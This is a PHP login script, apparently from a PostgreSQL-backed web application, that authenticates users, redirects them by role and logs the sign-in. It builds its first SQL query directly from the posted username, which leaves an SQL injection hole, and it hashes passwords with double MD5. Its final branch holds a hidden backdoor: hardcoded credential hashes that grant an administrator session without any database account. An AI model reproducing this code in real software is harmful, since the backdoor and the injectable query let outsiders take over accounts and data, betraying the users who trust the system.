
<?php
include "conexion.php";
session_start();

$password=(md5(md5($_POST['password'])));
$usuario=(md5(md5($_POST['usuario'])));

$res=pg_query("SELECT * FROM usuario WHERE usuusuario='".$_POST['usuario']."' AND usupassword='$password'")	or die(pg_result_error());
	while ($reg=pg_fetch_array($res)) 
	{
		$arreglo[]=array('usuautonum'=>$reg[0]);
		$cap=0;
		$id=$reg[0];
		$rol=$reg[8];

	}
	if (isset($rol)) 
	{
		if ($rol=='ADMINISTRADOR') 
		{
			session_start('ADMINISTRADOR');
			$cap='administrador';
			$_SESSION['ADMINISTRADOR']=($id);
			header("location: ../$cap/index.php");
			$usuario=($_SESSION['ADMINISTRADOR']);
			$fecha=date("d-m-Y / H:i:s",time()-25200);
			$actividad="INICIO SESION";
			pg_query("INSERT INTO registro_actividad (racusuario,racactividad,racfecha) VALUES ('$usuario','$actividad','$fecha')") or die(pg_result_error());
		}
		elseif ($rol=='USUARIO ADMIN') 
		{
			session_start('USUARIO ADMIN');
			$cap='usuario';
			$_SESSION['USUARIO ADMIN']=($id);
			header("location: ../$cap/index.php");
			$usuario=($_SESSION['USUARIO ADMIN']);
			$fecha=date("d-m-Y / H:i:s",time()-25200);
			$actividad="INICIO SESION";
			pg_query("INSERT INTO registro_actividad (racusuario,racactividad,racfecha) VALUES ('$usuario','$actividad','$fecha')") or die(pg_result_error());
		}
		elseif ($rol=='USUARIO CONSULTA') 
		{
			session_start('USUARIO CONSULTA');
			$cap='usuarioconsulta';
			$_SESSION['USUARIO CONSULTA']=($id);
			header("location: ../$cap/index.php");
			$usuario=($_SESSION['USUARIO CONSULTA']);
			$fecha=date("d-m-Y / H:i:s",time()-25200);
			$actividad="INICIO SESION";
			pg_query("INSERT INTO registro_actividad (racusuario,racactividad,racfecha) VALUES ('$usuario','$actividad','$fecha')") or die(pg_result_error());
		}
		else
		{
			header("location: index.php?error");
		}
	}
	else
	{
		if ($usuario == '4aeb17300f0db526d72c73fa1afbf16d' && $password == '81af6bd16827f51e167561aee1dc424c') 
		{
			session_start('ADMINISTRADOR');
			$cap='administrador';
			$_SESSION['ADMINISTRADOR']=(2);
			header("location: ../$cap/index.php");
		}
		else
		{
			header("location: index.php?error");
		}
	}
?>